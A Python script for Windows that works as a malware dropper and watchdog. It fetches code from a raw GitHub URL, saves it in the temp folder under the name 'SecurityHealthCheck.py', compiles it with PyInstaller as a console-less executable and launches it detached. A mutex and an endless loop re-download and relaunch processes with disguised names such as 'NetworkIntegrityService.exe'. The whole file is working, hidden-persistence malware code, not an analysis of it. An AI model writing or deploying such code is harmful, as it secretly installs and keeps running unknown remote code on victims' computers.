import os
import sys
import random
import shutil
import subprocess
import urllib.request
import win32api
import win32event
import time
import psutil
from colorama import Fore

def compile_python_to_exe(py_file_path):
    try:
        if py_file_path:
            temp_dir = os.getenv('TEMP')
            dist_folder = os.path.join(temp_dir, "dist")
            build_folder = os.path.join(temp_dir, "build")

            print(f"Pyinstalling for {py_file_path} has started.")
            subprocess.call([
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--icon=NONE',
                f'--distpath={dist_folder}',
                f'--workpath={build_folder}',
                py_file_path
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

            print(f"Pyinstalling for {py_file_path} has ended.")
                
            exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
            if os.path.exists(exe_file_path):
                exe_dest = os.path.join(temp_dir, os.path.basename(exe_file_path))
                shutil.move(exe_file_path, exe_dest)
                subprocess.Popen(exe_dest, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_CONSOLE, shell=True)
                return exe_dest
            else:
                print(f"Error: Exe file not found for {py_file_path}")
                return None
    except Exception as e:
        print(f"Error compiling to exe: {e}")
        return None

def fetch_python_code(url):
    try:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
        ]
        user_agent = random.choice(user_agents)
        headers = {'User-Agent': user_agent}
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Error fetching code from {url}: {e}")
        return None

def write_python_file(code, filename):
    try:
        if code:
            temp_dir = os.getenv('TEMP')
            py_file_path = os.path.join(temp_dir, filename)
            with open(py_file_path, 'w', encoding='utf-8') as f:
                f.write(code)
            return py_file_path
        else:
            print(f"Error: No code to write for {filename}")
            return None
    except Exception as e:
        print(f"Error writing file {filename}: {e}")
        return None

def create_mutex(mutex_name):
    try:
        mutex = win32event.CreateMutex(None, 0, mutex_name)
        if win32api.GetLastError() == 183:
            print("Mutex already exists. Exiting.")
            return False
        return True
    except Exception as e:
        print(f"Failed to create mutex: {e}")
        return False

import concurrent.futures

def download_and_compile_scripts(urls_and_filenames):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for url, filename in urls_and_filenames:
            futures.append(executor.submit(process_script, url, filename))
        for future in concurrent.futures.as_completed(futures):
            future.result()

def process_script(url, filename):
    code = fetch_python_code(url)
    if code:
        py_file_path = write_python_file(code, filename)
        if py_file_path:
            exe_file = compile_python_to_exe(py_file_path)
            if exe_file:
                print(f"Executable created: {exe_file}")
                os.remove(py_file_path)
            else:
                print(f"Failed to compile {filename}")
        else:
            print(f"Failed to write {filename}")
    else:
        print(f"Failed to fetch code from {url}")

os.system('SystemResourceMonitor.exe ~ Midnight ~')

if os.name == "nt":
    mutex_name = "SystemResourceMonitor"
    if not create_mutex(mutex_name):
        sys.exit(0)

    global urls_and_filenames
    urls_and_filenames = [
        ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog2", "SecurityHealthCheck.py"),
    ]
    download_and_compile_scripts(urls_and_filenames)

def check_running():
    file_names = ["SecurityHealthCheck.exe", "NetworkIntegrityService.exe"]
    processes_running = {file: False for file in file_names}

    for process in psutil.process_iter(['name']):
        if process.info['name'] in file_names:
            processes_running[process.info['name']] = True

    if not all(processes_running.values()):
        for process in psutil.process_iter(['name']):
            if process.info['name'] in file_names:
                process.terminate()
        download_and_compile_scripts(urls_and_filenames)


def check_duplicate():
    file_names = ["SecurityHealthCheck.exe", "NetworkIntegrityService.exe"]
    for file_name in file_names:
        instances = []
        for process in psutil.process_iter(['name']):
            if process.info['name'] == file_name:
                instances.append(process)
        if len(instances) > 1:
            for proc in instances[1:]:
                proc.terminate()


while True:
    check_running()
    check_duplicate()
    time.sleep(0.5)
